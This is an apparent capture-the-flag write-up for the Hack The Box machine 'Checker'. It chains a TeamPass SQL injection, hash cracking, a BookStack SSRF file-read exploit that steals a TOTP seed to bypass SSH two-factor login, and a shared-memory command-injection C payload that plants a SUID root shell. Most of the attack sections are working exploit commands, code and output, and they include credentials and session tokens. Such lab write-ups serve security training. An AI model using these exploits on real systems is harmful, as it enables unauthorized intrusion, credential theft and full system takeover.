# Nmap
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
80/tcp   open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
8080/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
When I come check the page, it will redirect to `http://checker.htb`,
So let's add `checker.htb` to our `/etc/hosts`
# Page check
This is the port 80 web service
![](images/Pasted%20image%2020250310102023.png)
In this place, I don't have any default credit and I did not find the register page.

This is port 8080 web service
![[images/Screenshot 2025-04-19 at 11.06.04 PM.png]]
From this page source code, I found something interesting here
```
<link rel="shortcut icon" type="image/png" href="[http://vault.checker.htb/favicon.ico](view-source:http://vault.checker.htb/favicon.ico)"/>
</head>
```
There is another sub-domain here `vault.checker.htb`
But when we want to check what is going on in this subdomain, it would redirect to `http://checker.htb/login`
![](images/Pasted%20image%2020250420091030.png)

So let's continue to check the vulnerability of this port 8080

# CVE-2023-1545
I want to check the service `Teampass` from the exploit-db
Then we found `TeamPass 3.0.0.21 - SQL Injection` from exploit-db, we can also run the exploit script here.
```
python3 sql_injection.py http://checker.htb:8080/
2025-04-20 09:12:47,926 - INFO - Encontrados 2 usuários no sistema
2025-04-20 09:12:48,216 - INFO - Credenciais obtidas para: admin
2025-04-20 09:12:48,506 - INFO - Credenciais obtidas para: bob

Credenciais encontradas:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
```

Use john to crack and get bob's password
```
bob:cheerleader
```

Then we can successfully get into the dashboard
![](images/Pasted%20image%2020250420091511.png)
Then we can check the items to find something interesting
![](images/Pasted%20image%2020250420091639.png)
We can get the credit `bob@checker.htb:mYSeCr3T_w1kI_P4sSw0rD`

And also, we can use this login to the web service of port 80
![](images/Pasted%20image%2020250420091744.png)
Try to ssh to connect the account reader
`reader：hiccup-publicly-genesis`
![](images/Pasted%20image%2020250420091859.png)
But we can not login directly
```
ssh reader@checker.htb
(reader@checker.htb) Password: 
(reader@checker.htb) Verification code: 
```
There will be a Verification code here

From the source code of `BookStack`, we can find the version of this service
```
 <!-- Social Cards Meta -->
    <meta property="og:title" content="BookStack">
    <meta property="og:url" content="http://checker.htb">
    
    <!-- Styles -->
    <link rel="stylesheet" href="[http://checker.htb/dist/styles.css?version=v23.10.2](view-source:http://checker.htb/dist/styles.css?version=v23.10.2)">
```
`BookStack v23.10.2`

# CVE-2023-6199
Then we can search about this version of service, and find something vulnerable
`LFR via SSRF in BookStack: Beware of insecure-by-default libraries!`
There is a blog to explain the detailed process
```
https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack
https://github.com/synacktiv/php_filter_chains_oracle_exploit.git
```
And we can try to use this script to get the result

I’ll have to modify the script to so that it sends the URL in a `base64-encoded` image tag.
To make this work, I’ll need to take the filter_chain output, `base64-encode` it, and put it into an image tag. Let's importing `b64decode` at the top of the file, and then add a line
```
 from base64 import b64encode

 filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        # DEBUG print(filter_chain)
        filter_chain = f"<img src='data:image/png;base64,{b64encode(filter_chain.encode()).decode()}'/>"
        merged_data = self.parse_parameter(filter_chain)
```

Then let's come to create a new book and a new page and use `burpsuite` to catch the request
![](images/Pasted%20image%2020250728135400.png)
Wait for a few seconds, then we can get the request:
![](images/Pasted%20image%2020250728135428.png)
From the request, we have -
```
The URL endpoint: http://checker.htb/ajax/page/8/save-draft

X-CSRF-TOKEN: X-CSRF-TOKEN: 5dcVWGgliR7TGbVjztGwah5FDaXX4IaYRSwmXRXA

bookstack_session:
bookstack_session=eyJpdiI6IlRCeXA5YXBvbE0wdkVlb01uU0ZPWVE9PSIsInZhbHVlIjoiU0g1cGhLY0hhQkVzbEh1SGg1amt3dzY0NTg4STNweVJmZW1EUm5DV0k4ZGp3YmIxZmphSlE0QjVMSWZyNkJhWWxhOHEvZk5zbzR1VU40cnB5RCs5RzM5NWQ3TWpydHRRWllRTWNRYWYxMnJQTm1lM3lZN2JOWU5RZUhmUjBoV3giLCJtYWMiOiI3MzIyMmE3YWI5NTE2ODc2OTkyNTA4MDI2NmQ3OWM0YzllZmRlNDhhMGZmZTI4MTJhZDE3MTYyOTA1ZWJiYmRkIiwidGFnIjoiIn0%3D; 
```

Let's try to make the exploit script
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Checker/php_filter_chains_oracle_exploit]
└─$ python3 filters_chain_oracle_exploit.py \
--target 'http://checker.htb/ajax/page/8/save-draft' \
--file '/etc/passwd' \
--verb PUT \
--parameter html \
--proxy http://127.0.0.1:8080 \
--log loot.txt \
--headers '{"X-CSRF-TOKEN": "5dcVWGgliR7TGbVjztGwah5FDaXX4IaYRSwmXRXA", "Cookie": "XSRF-TOKEN=eyJpdiI6IjEzNVNHMWF3NEVtU00zSDlMYkpGVnc9PSIsInZhbHVlIjoiRVFJbWZJTEtRd3ZhNno5NDA1NmdFOXVPUjhwaWRFYUdTdFVFTDZvRitOdVl0cHNpMWZlUU4zMHNpQ1ZiVDR5M0ZYZ00xQlJQYnRyRCtwUlJzR0xYbWZFL3VWN1RHWkRYZGI1TGcrVk5adXJhRHpiODN5a0tvcHE4VFROOHV6NVYiLCJtYWMiOiI5NmRkNzRmY2I2ZTNlYTFjOTU0Yzk0YWYzODc5ZWNlNmQ0ZDQ1NjE5MDYzN2EzMmIyMzYwZDdlMGY4NmFmZWYzIiwidGFnIjoiIn0%3D;bookstack_session=eyJpdiI6IlRCeXA5YXBvbE0wdkVlb01uU0ZPWVE9PSIsInZhbHVlIjoiU0g1cGhLY0hhQkVzbEh1SGg1amt3dzY0NTg4STNweVJmZW1EUm5DV0k4ZGp3YmIxZmphSlE0QjVMSWZyNkJhWWxhOHEvZk5zbzR1VU40cnB5RCs5RzM5NWQ3TWpydHRRWllRTWNRYWYxMnJQTm1lM3lZN2JOWU5RZUhmUjBoV3giLCJtYWMiOiI3MzIyMmE3YWI5NTE2ODc2OTkyNTA4MDI2NmQ3OWM0YzllZmRlNDhhMGZmZTI4MTJhZDE3MTYyOTA1ZWJiYmRkIiwidGFnIjoiIn0%3D", "Content-Type": "application/x-www-form-urlencoded"}'
[*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft
[*] The following local file is leaked : /etc/passwd
[*] Running PUT requests
[*] Additionnal headers used : {"X-CSRF-TOKEN": "5dcVWGgliR7TGbVjztGwah5FDaXX4IaYRSwmXRXA", "Cookie": "XSRF-TOKEN=eyJpdiI6IjEzNVNHMWF3NEVtU00zSDlMYkpGVnc9PSIsInZhbHVlIjoiRVFJbWZJTEtRd3ZhNno5NDA1NmdFOXVPUjhwaWRFYUdTdFVFTDZvRitOdVl0cHNpMWZlUU4zMHNpQ1ZiVDR5M0ZYZ00xQlJQYnRyRCtwUlJzR0xYbWZFL3VWN1RHWkRYZGI1TGcrVk5adXJhRHpiODN5a0tvcHE4VFROOHV6NVYiLCJtYWMiOiI5NmRkNzRmY2I2ZTNlYTFjOTU0Yzk0YWYzODc5ZWNlNmQ0ZDQ1NjE5MDYzN2EzMmIyMzYwZDdlMGY4NmFmZWYzIiwidGFnIjoiIn0%3D;bookstack_session=eyJpdiI6IlRCeXA5YXBvbE0wdkVlb01uU0ZPWVE9PSIsInZhbHVlIjoiU0g1cGhLY0hhQkVzbEh1SGg1amt3dzY0NTg4STNweVJmZW1EUm5DV0k4ZGp3YmIxZmphSlE0QjVMSWZyNkJhWWxhOHEvZk5zbzR1VU40cnB5RCs5RzM5NWQ3TWpydHRRWllRTWNRYWYxMnJQTm1lM3lZN2JOWU5RZUhmUjBoV3giLCJtYWMiOiI3MzIyMmE3YWI5NTE2ODc2OTkyNTA4MDI2NmQ3OWM0YzllZmRlNDhhMGZmZTI4MTJhZDE3MTYyOTA1ZWJiYmRkIiwidGFnIjoiIn0%3D", "Content-Type": "application/x-www-form-urlencoded"}
  [*] File leak gracefully stopped.
[+] File /etc/passwd was partially leaked
cm9vdDp4OjA6MDpyb290Oi9yb2
b'root:x:0:0:root:/ro'
[*] Info logged in : loot.txt
```

Since this script relies heavily on false positives for brute force cracking, it will be very slow.

When I check the books to find something useful, we can found 
![](images/Pasted%20image%2020250728141059.png)
This script may indicate that the` /home `directory on the target is `recurisvely` being backed up to `/backup/home_backup`.
And remember when we want to ssh connect account `reader`, it needs the `2FA` code.
`https://ubuntu.com/tutorials/configure-ssh-2fa?ref=benheater.com#3-configuring-authentication`
This article shows us how to set up that function
This page suggests there should be `.google_authenticator` file local to the user's home directory

So we need to `LFI` the file of `/backup/home_backup/home/reader/.google_authenticator`
That will be a very long time :(
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Checker/php_filter_chains_oracle_exploit]
└─$ python3 filters_chain_oracle_exploit.py \
--target 'http://checker.htb/ajax/page/8/save-draft' \
--file '/backup/home_backup/home/reader/.google_authenticator' \
--verb PUT \
--parameter html \
--proxy http://127.0.0.1:8080 \
--log loot.txt \
--headers '{"X-CSRF-TOKEN": "5dcVWGgliR7TGbVjztGwah5FDaXX4IaYRSwmXRXA", "Cookie": "XSRF-TOKEN=eyJpdiI6IjEzNVNHMWF3NEVtU00zSDlMYkpGVnc9PSIsInZhbHVlIjoiRVFJbWZJTEtRd3ZhNno5NDA1NmdFOXVPUjhwaWRFYUdTdFVFTDZvRitOdVl0cHNpMWZlUU4zMHNpQ1ZiVDR5M0ZYZ00xQlJQYnRyRCtwUlJzR0xYbWZFL3VWN1RHWkRYZGI1TGcrVk5adXJhRHpiODN5a0tvcHE4VFROOHV6NVYiLCJtYWMiOiI5NmRkNzRmY2I2ZTNlYTFjOTU0Yzk0YWYzODc5ZWNlNmQ0ZDQ1NjE5MDYzN2EzMmIyMzYwZDdlMGY4NmFmZWYzIiwidGFnIjoiIn0%3D;bookstack_session=eyJpdiI6IlRCeXA5YXBvbE0wdkVlb01uU0ZPWVE9PSIsInZhbHVlIjoiU0g1cGhLY0hhQkVzbEh1SGg1amt3dzY0NTg4STNweVJmZW1EUm5DV0k4ZGp3YmIxZmphSlE0QjVMSWZyNkJhWWxhOHEvZk5zbzR1VU40cnB5RCs5RzM5NWQ3TWpydHRRWllRTWNRYWYxMnJQTm1lM3lZN2JOWU5RZUhmUjBoV3giLCJtYWMiOiI3MzIyMmE3YWI5NTE2ODc2OTkyNTA4MDI2NmQ3OWM0YzllZmRlNDhhMGZmZTI4MTJhZDE3MTYyOTA1ZWJiYmRkIiwidGFnIjoiIn0%3D", "Content-Type": "application/x-www-form-urlencoded"}'
[*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft
[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
[*] Running PUT requests
[*] Additionnal headers used : {"X-CSRF-TOKEN": "5dcVWGgliR7TGbVjztGwah5FDaXX4IaYRSwmXRXA", "Cookie": "XSRF-TOKEN=eyJpdiI6IjEzNVNHMWF3NEVtU00zSDlMYkpGVnc9PSIsInZhbHVlIjoiRVFJbWZJTEtRd3ZhNno5NDA1NmdFOXVPUjhwaWRFYUdTdFVFTDZvRitOdVl0cHNpMWZlUU4zMHNpQ1ZiVDR5M0ZYZ00xQlJQYnRyRCtwUlJzR0xYbWZFL3VWN1RHWkRYZGI1TGcrVk5adXJhRHpiODN5a0tvcHE4VFROOHV6NVYiLCJtYWMiOiI5NmRkNzRmY2I2ZTNlYTFjOTU0Yzk0YWYzODc5ZWNlNmQ0ZDQ1NjE5MDYzN2EzMmIyMzYwZDdlMGY4NmFmZWYzIiwidGFnIjoiIn0%3D;bookstack_session=eyJpdiI6IlRCeXA5YXBvbE0wdkVlb01uU0ZPWVE9PSIsInZhbHVlIjoiU0g1cGhLY0hhQkVzbEh1SGg1amt3dzY0NTg4STNweVJmZW1EUm5DV0k4ZGp3YmIxZmphSlE0QjVMSWZyNkJhWWxhOHEvZk5zbzR1VU40cnB5RCs5RzM5NWQ3TWpydHRRWllRTWNRYWYxMnJQTm1lM3lZN2JOWU5RZUhmUjBoV3giLCJtYWMiOiI3MzIyMmE3YWI5NTE2ODc2OTkyNTA4MDI2NmQ3OWM0YzllZmRlNDhhMGZmZTI4MTJhZDE3MTYyOTA1ZWJiYmRkIiwidGFnIjoiIn0%3D", "Content-Type": "application/x-www-form-urlencoded"}
[+] File /backup/home_backup/home/reader/.google_authenticator leak is finished!
RFZEQlJBT0RMQ1dGN0kyT05BNEs1TFFMVUUKIiBUT1RQX0FVVEgK
b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'
[*] Info logged in : loot.txt

```

That seed, along with the current time, is what is used to generate the `2FA` six-digit number.
So I would use `oathtool` to help us get the `2FA` code
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Checker/php_filter_chains_oracle_exploit]
└─$ oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE
222736

```

Then we can use this credit `reader：hiccup-publicly-genesis` and `2FA` code to ssh connect.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Checker/php_filter_chains_oracle_exploit]
└─$ ssh reader@10.10.11.56          
The authenticity of host '10.10.11.56 (10.10.11.56)' can't be established.
ED25519 key fingerprint is SHA256:u+MO4ts76K9g5kfUQeWpsBr5N+EpHTMxGoQv4K7LFgg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:198: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.56' (ED25519) to the list of known hosts.
(reader@10.10.11.56) Password: 
(reader@10.10.11.56) Verification code: 
Error "Operation not permitted" while writing config

```

That seems we need to use the timezone of target machine
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Checker/php_filter_chains_oracle_exploit]
└─$ oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE --now="$(date -d "$(curl -v http://checker.htb -s 2>&1 | grep Date | cut -d' ' -f 3- | tr -d '\r')" "+%Y-%m-%d %H:%M:%S")"
769152


┌──(wither㉿localhost)-[~/Templates/htb-labs/Checker/php_filter_chains_oracle_exploit]
└─$ ssh reader@10.10.11.56
(reader@10.10.11.56) Password: 
(reader@10.10.11.56) Verification code: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Last login: Mon Jul 28 04:39:06 2025 from 10.10.14.6
reader@checker:~$ 

```

That totally correct for us.

# Privilege Escalation
Firstly I would like to check `sudo -l`
```
reader@checker:~$ sudo -l
Matching Defaults entries for reader on checker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *

```

We can read the source code of this script
```
reader@checker:~$ cat /opt/hash-checker/check-leak.sh
#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"

reader@checker:~$ ls -al /opt/hash-checker/
total 68
drwxr-xr-x 2 root root  4096 Jan 30 17:09 .
drwxr-xr-x 5 root root  4096 Jan 30 17:04 ..
-r-------- 1 root root   118 Jan 30 17:07 .env
-rwxr--r-- 1 root root   141 Jan 30 17:04 check-leak.sh
-rwxr--r-- 1 root root 42376 Jan 30 17:02 check_leak
-rwx------ 1 root root   750 Jan 30 17:07 cleanup.sh
-rw-r--r-- 1 root root  1464 Jan 30 17:09 leaked_hashes.txt

reader@checker:/opt/hash-checker$ file check_leak
check_leak: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f1d8ae448c936df395ad9e825b897965da88afd8, for GNU/Linux 3.2.0, with debug_info, not stripped
```

We can't do anything with `.env` and `check_leak` is a binary-exec file, we can not replace it 
But we can check the `leaked_hashes.txt` file
```
reader@checker:/opt/hash-checker$ cat leaked_hashes.txt 
$2b$10$rbzaxiT.zUi.e28wm2ja8OGx.jNamreNFQC6Kh/LeHufCmduH8lvy
$2b$10$Tkd9LwWOOzR.DWdzj9aSp.Bh.zQnxZahKel4xMjxLIHzdostFVqsK
$2b$10$a/lpwbKF6pyAWeGHCVARz.JOi3xtNzGK..GZON/cFhNi1eyMi4UIC
$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
$2b$10$DanymKXfnu1ZTrRh3JwBhuPsmjgOEBJLNEEmLPAAIfG9kiOI28fIC
$2b$10$/GwrAIQczda3O5.rnGb4IOqEE/JMU4TIcy95ECSh/pZBQzhlWITQ.
$2b$10$Ef6TBE9GdSsjUPwjm0NYlurGfVO/GdtaCsWBpVRPnQsCbYgf4oU8a
$2b$10$/KLwuhoXHfyKpq1qj8BDcuzNyhR0h0g27jl0yiX7BpBL9kO.wFWii
$2b$10$Ito9FRIN9DgMHWn20Zgfa.yKKlJ.HedScxyvymCxMYTWaZANHIzvO
$2b$10$J025XtUSjTm.kUfa19.6geInkfiISIjkr7unHxT4V/XDIl.2LYrZ2
$2b$10$g962m7.wovzDRPI/4l0GEOviIs2WUPBqlkPgVAPfsYpa138dd9aYK
$2b$10$keolOsecWXEyDIN/zDPVbuc/UOjGjnZGblpdBPQAfZDVm2fRIDUCq
$2b$10$y2Toog209OyRWk6z7S7XNOAkVBijv3HwNBpKk.R1bPCYuR8WxrL66
$2b$10$O4OQizv0TVsWxWi26tg8Xu3SCS29ZEv9JqwlY5ED240qW8V0eyG7a
$2b$10$/1ePaOFZrcpNHWFk72ZNpepXRvXIi1zMSBYBGGqxfUlxw/JiQQvCG
$2b$10$/0az8KLoanuz3rfiN.Ck9./Mt6IHxs5OGtKbgM31Z0NH9maz1hPDe
$2b$10$VGR3JK.E0Cc3OnY9FuB.u.qmwFBBRCrRLAvUlPnO5QW5SpD1tEeDO
$2b$10$9p/iOwsybwutYoL3xc5jaeCmYu7sffW/oDq3mpCUf4NSZtq2CXPYC
$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
$2b$10$8cXny33Ok0hbi2IY46gjJerQkEgKj.x1JJ6/orCvYdif07/tD8dUK
$2b$10$QAcqcdyu1T1qcpM4ZQeM6uJ3dXw2eqT/lUUGZvNXzhYqcEEuwHrvS
$2b$10$M1VMeJrjgaIbz2g2TCm/ou2srr4cd3c18gxLA32NhvpXwxo3P5DZW
$2b$10$rxp3yM98.NcbD3NeHLjGUujzIEWYJ5kiSynHOHo0JvUvXq6cBLuRO
$2b$10$ZOUUTIj7JoIMwoKsXVOsdOkTzKgHngBCqkt.ASKf78NUwfeIB4glK
```
Don't have any hints or usernames

Let's try to use `sudo` to run this script
```
reader@checker:/opt/hash-checker$ sudo /opt/hash-checker/check-leak.sh
Error: <USER> is not provided.
reader@checker:/opt/hash-checker$ sudo /opt/hash-checker/check-leak.sh reader
User not found in the database.
reader@checker:/opt/hash-checker$ sudo /opt/hash-checker/check-leak.sh admin
User is safe.
reader@checker:/opt/hash-checker$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0x9C78 as temp location
User will be notified via bob@checker.htb
```

It looks like it is checking whether the specified user's hash in the database appears in the `leaked_hash.txt` file.
He also mentioned shared memory, which I think is a hint that he has some binary vulnerabilities.

So let's download it to our local machine and use `Ghidra` to `decompile` it
![](images/Pasted%20image%2020250728144250.png)
Firstly, get the attribute from the `.env`
![](images/Pasted%20image%2020250728144338.png)
Only allow `20 characters`
![](images/Pasted%20image%2020250728144604.png)
Check the password hash from database, then notify users and clear shared memory

The program writes a string to a shared memory buffer, sleeps for one second, and then uses that buffer to craft a command sent to `popen`. If I can change that memory, I can command inject to run arbitrary commands as root.

The payload could be (I am not talented in this part, payload from `0xdf`)
```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>

int main() {
    time_t now = (unsigned int) time(NULL);
    srand(now);
    int key = rand() % 0xfffff;
    int shmid = shmget(key, 0x400, 0x3b6);
    char *h_shm = shmat(shmid, (void *) 0, 0);
    snprintf(h_shm, 0x400, "Leaked hash detected at whenever > '; cp /bin/bash /tmp/wither; chmod 6777 /tmp/wither;#");
    shmdt(h_shm);
}
```

Then let's upload it and run it 
```
reader@checker:~$ while true; do ./shell ; done
```

Then start another shell
```
reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0x13A27 as temp location
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' at line 1
Failed to read result from the db
reader@checker:~$ ls /tmp
snap-private-tmp                                                                systemd-private-0e17ef9ea7d447aa980a7ae5a33fa2fa-systemd-resolved.service-XXV381   wither
systemd-private-0e17ef9ea7d447aa980a7ae5a33fa2fa-apache2.service-lb7Ihb         systemd-private-0e17ef9ea7d447aa980a7ae5a33fa2fa-systemd-timesyncd.service-YzyReX
systemd-private-0e17ef9ea7d447aa980a7ae5a33fa2fa-systemd-logind.service-461ZO1  vmware-root_604-2731152132
reader@checker:~$ /tmp/wither -p
wither-5.1# id
uid=1000(reader) gid=1000(reader) euid=0(root) egid=0(root) groups=0(root),1000(reader)
wither-5.1# 
```


# Description
For the footpath, it is very interesting to use `LFI` to get the 2FA code.
For the root, I am not talented in reverse engineering and binary vulnerable, so please check it from others.